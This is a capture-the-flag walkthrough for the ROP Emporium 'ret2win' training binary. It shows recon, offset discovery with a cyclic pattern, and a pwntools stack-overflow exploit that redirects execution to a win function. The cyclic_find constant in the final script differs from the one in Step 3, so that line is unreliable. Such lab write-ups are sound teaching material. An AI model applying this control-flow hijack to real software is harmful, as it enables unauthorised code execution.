# ret2win (x86_64)

## Challenge Overview
`ret2win` is the first challenge in the ROP Emporium series. The binary reads user input into a stack buffer, due to a lack of bounds checking, the read functions allows a classic stack buffer overflow.
The binary also contains a function named `ret2win()` that is never called during normal execution but prints the flag when called. The goal is simple: overflow the buffer, overwrite the stack where the next instructions are stored and redirect execution into the `ret2win()` function.


## Step 1: Recon
Doing a checksec on the binary we get the following result:
```bash
$ pwn checksec ./ret2win

    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

What this tells us:
- **No canary:** we can overflow the buffer without worrying about a stack cookie detecting corruption.
- **NX enabled:** we can't just jump to shellcode placed on the stack, execution has to be redirected to existing code
- **No Pie:** the binary's addresses are fixed at complie time, so we can hardcode function addresses directly in our exploit script without needing to leak anything.

---

## Step 2: Find the target function's address

```bash
$ objdump -d ./ret2win | grep '<ret2win>:'
```

This gives us the address of the win function:
```bash
0000000000400756 <ret2win>:
```

In our script we will use a given method from pwntools to get the address without manually writing it:
```python
from pwn import *
elf = ELF('./ret2win')
ret2win_addr = elf.symbols["ret2win"]
```
---

## Step 3: Find the offset to the return address

Using a cyclic pattern to find exactly how many bytes it takes to reach the saved return address is the most efficent way:

```python
from pwn import *

io = gdb.debug(elf.path)

io.sendline(cyclic(200))
```


We feed that cyclic pattern to the binary inside the gdb session, let it crash, then check what value ended up in `$rsp or cause the segfault, and we resolve the offset:

```python
offset = cyclic_find(0x6161616c6161616b)
```

This gives us the `offset`, the number of bytes from the start of your input to the first byte of the saved return address.

---
## Step 4: Build the exploit

```python
from pwn import *

elf = ELF('./ret2win')

offset = cyclic_find(0x61616c6161616b)
ret2win_addr =  elf.symbols['ret2win']
random_ret = 0x40053e

payload = flat(
        b'a' * offset,
        random_ret,
        ret2win_addr,
)


p = elf.process()

print(p.recv())
p.sendline(payload)
p.interactive()

```

### Elaborations:
- `b'a' * offset`: padding to fill up the buffer and overflow it, the contents does not matter only the length.
- `random_ret`: is a random return instruction i found using ropper, the purpose of it is to align the ret2win address because when calling a function in x86_64, the stack point must be 16 byte aligned (`rsp % 16 must equal 0).
- `flat()`: this function simplifies the packing of the data, it takes care of the indiannes and everything else.

---

## Step 5: Run it

```bash
python3 ret2win.py
```

And hopefully everything lines up, and we execute the `ret2win()` function and prints the flag.

---

### Result

```bash
$ python3 ret2win.py

ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

>
Thank you!
Well done! Here's your flag:

ROPE{a_placeholder_32byte_flag!}

[+] The binary has finished running
```

### Lesson

This challenge is about **contorl-flow hijacking**: find the offset to the saved return address, overwrite it with known code addresses, exploit.